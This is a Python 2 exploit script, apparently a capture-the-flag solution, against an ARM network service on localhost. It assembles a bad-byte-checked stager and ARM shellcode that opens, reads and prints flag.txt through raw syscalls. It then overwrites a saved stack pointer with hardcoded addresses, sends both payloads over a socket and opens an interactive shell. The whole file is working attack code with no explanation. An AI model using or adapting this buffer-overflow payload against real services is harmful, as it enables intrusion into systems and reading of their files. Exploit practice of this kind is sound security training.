stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
    # 1508:	e3500000 	cmp	r0, #0
    mov r3, #0x15
    lsl r3, #8
    eor r4, r4
    str r4, [r3, #0x08]
    # 00001400 <_start>:
    mov r3, #0x14
    lsl r3, #8
    bx r3
.ascii "%s"
'''
asm = '''.section .text
.global _start

.ascii "%s"
_start:
    nop
    nop
    nop
    eor r4, r4, r4
    b get_addr
ret:
    mov r3, lr
open:
    mov r0, r3
    mov r1, r4
    mov r2, r4
    svc     0x00000066
read:
    mov r1, r3
    mov r2, #0x7f
    svc     0x0000006a
write:
    mov r0, #1
    mov r1, r3
    mov r2, #0x7f
    svc     0x00000069
exit:
    svc     0x00000011
get_addr:
    bl ret
.ascii "%s"
  '''
import os, sys
from lib.mylib import *

IP = '127.0.0.1'
PORT = 10000
ARCH = 'arm'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > 28:
    raise Exception('too long')
stager = stager.ljust(28, 'A')

# make shellcode
open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
shellcode = shellcode.ljust(0x7f, '\x00')

s = mysock(IP, PORT)

SP = 0x1adc
first = stager + p(SP)[0:2] + '\n'
sl(s, '\n000')
sl(s, first)

SP = 0x1afc
shellcode = 'A' * 28 + p(SP) + shellcode + '\n'
sl(s, '\n000')
sl(s, shellcode)
shell(s)
